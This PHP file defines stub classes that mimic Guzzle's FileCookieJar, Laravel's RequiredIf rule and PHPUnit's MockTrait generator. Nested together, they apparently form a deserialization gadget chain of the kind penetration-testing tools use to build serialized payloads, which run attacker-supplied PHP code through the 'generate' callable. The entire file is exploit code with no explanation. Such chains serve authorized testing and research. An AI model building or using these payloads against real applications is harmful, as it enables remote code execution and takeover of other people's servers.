<?php

namespace GuzzleHttp\Cookie
{
	class FileCookieJar
	{
		private $filename;
		
		public function __construct($code)
		{
		    $this->filename = new \Illuminate\Validation\Rules\RequiredIf($code);
		}
	}
}

namespace Illuminate\Validation\Rules {
    class RequiredIf
    {
        public $condition;

        public function __construct($code)
        {
            $this->condition = [
                new \PHPUnit\Framework\MockObject\Generator\MockTrait($code), 
                "generate"
            ];
        }
    }
}

namespace PHPUnit\Framework\MockObject\Generator 
{
    class MockTrait
    {
        private $classCode;
        private $mockName;

        function __construct($classCode) 
        {
            $this->classCode = $classCode;
            $this->mockName = "asd";
        }
    }
}